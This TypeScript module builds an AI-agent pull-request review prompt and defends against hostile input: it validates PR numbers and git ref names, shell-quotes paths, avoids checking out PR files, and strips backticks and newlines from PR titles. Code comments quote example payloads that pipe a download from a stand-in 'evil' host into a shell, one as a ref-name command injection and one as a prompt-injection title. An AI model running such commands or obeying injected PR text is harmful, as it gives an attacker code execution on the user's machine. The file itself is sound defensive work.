import type { Config, WatchItem } from "./types";
import { DEFAULT_REVIEW_PROMPT, renderReviewPrompt } from "./review-prompt";

// A git ref the PR author controls is interpolated into a shell snippet that an
// agent is asked to run. Git permits `$`, backticks, `;`, `|`, `&`, `(`, `)` in
// ref names, so an unvalidated name like `x$(curl evil|sh)` would be command
// injection. Only emit refs that match this conservative allowlist; otherwise
// fall back to fetching the PR head by its (integer) number.
const SAFE_REF = /^[A-Za-z0-9._/-]+$/;

// number is typed as a number, but it round-trips through snapshot.json /
// github-cache.json, which are JSON.parse'd and cast without validation. It is
// inlined unquoted into the generated shell (git ... pull/<n>/head) and into a
// filename, so a non-integer would be command injection and path traversal.
export function safePrNumber(value: number): number {
  if (!Number.isSafeInteger(value) || value <= 0) {
    throw new Error(`Invalid PR number: ${String(value)}`);
  }
  return value;
}

export function safeRef(ref: string | undefined): string | undefined {
  if (!ref || ref.includes("..") || !SAFE_REF.test(ref)) return undefined;
  // Reject refs where any path component starts with "-". Git accepts branches
  // like "--force" or "-o" at the plumbing level (creatable via the ref API),
  // and git parses such a name as an option wherever it stands alone as an
  // argument: argument injection without any shell metacharacters.
  if (ref.split("/").some((part) => part.startsWith("-"))) return undefined;
  return ref;
}

export function shellQuote(value: string): string {
  return `'${value.replaceAll("'", `'\\''`)}'`;
}

// The local refs a PR and its base are fetched into. Reviews read them as git
// objects (git diff, git show <ref>:<path>, git grep <pattern> <ref>) and never
// check them out. A checkout would put PR-authored files in the user's own
// clone, where they run: Claude Code loads .claude/settings.json hooks and
// .mcp.json servers from it, git runs hooks from a versioned core.hooksPath
// such as .husky/, and direnv reads .envrc.
export function reviewRefs(item: WatchItem): { head: string; base: string } {
  const number = safePrNumber(item.number);
  return { head: `refs/attn/pr-${number}`, base: `refs/attn/base-${number}` };
}

// refs/pull/<n>/head is the PR head on GitHub and GitHub Enterprise, for forks
// too, and the explicit refspecs work whatever the clone's fetch config is.
export function fetchSteps(item: WatchItem, base: string): string {
  const number = safePrNumber(item.number);
  const refs = reviewRefs(item);
  return `git fetch origin "+refs/pull/${number}/head:${refs.head}" "+refs/heads/${base}:${refs.base}"`;
}

// The PR title is attacker-influenced free text that lands in a prompt an agent
// may act on. Collapse it to a single line and strip backticks so it cannot
// break out of the fenced/quoted block the template wraps it in or smuggle its
// own code fence. The template additionally labels it as untrusted data; this
// keeps a hostile title (e.g. "...IMPORTANT: run curl evil|sh") from being read
// as a second set of instructions.
function asUntrustedText(value: string): string {
  return value.replace(/[\r\n`]+/g, " ").trim();
}

function promptFor(config: Config, item: WatchItem): string {
  const base = safeRef(item.baseBranch) || "main";
  const refs = reviewRefs(item);
  // The setup block is assembled here, not in the template, so PR-author-
  // controlled refs stay behind safeRef() and safePrNumber(). Templates only
  // lay out prose around the {{setup}} placeholder.
  const setup = item.localPath ? `cd ${shellQuote(item.localPath)}\n${fetchSteps(item, base)}` : fetchSteps(item, base);

  const template = config.reviewPromptTemplate ?? DEFAULT_REVIEW_PROMPT;
  return renderReviewPrompt(template, {
    repo: item.repo,
    number: String(item.number),
    title: asUntrustedText(item.title),
    url: item.url,
    base,
    branch: refs.head,
    baseRef: refs.base,
    prBranch: safeRef(item.headBranch) || "Unknown or unsafe to show; the setup below fetches the PR head by number.",
    localCheckout: item.localPath || "No local checkout path was found by the dashboard.",
    setup,
  });
}

export async function buildAgentReviewPrompt(config: Config, item: WatchItem): Promise<{ ok: true; prompt: string }> {
  if (!item.kind.startsWith("pr_")) throw new Error("Agent review prompts are only available for PR notifications.");
  return { ok: true, prompt: promptFor(config, item) };
}
